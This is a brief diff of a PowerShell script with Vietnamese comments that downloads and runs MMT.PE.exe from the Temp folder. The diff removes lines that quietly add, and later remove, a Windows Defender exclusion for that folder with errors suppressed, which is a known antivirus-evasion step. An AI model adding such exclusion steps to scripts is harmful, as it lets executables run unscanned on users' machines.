@@ -1,5 +1,3 @@
-# Thêm exclusion (không hiển thị chi tiết)
-Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp" -Force -ErrorAction SilentlyContinue
 
 # Tải và chạy file
 $filePath = "$env:USERPROFILE\AppData\Local\Temp\MMT.PE.exe"
@@ -10,5 +8,3 @@ if (Test-Path $filePath) {
     Remove-Item $filePath -Force -ErrorAction SilentlyContinue
 }
 
-# Xóa exclusion (không hiển thị chi tiết)
-Remove-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp" -Force -ErrorAction SilentlyContinue
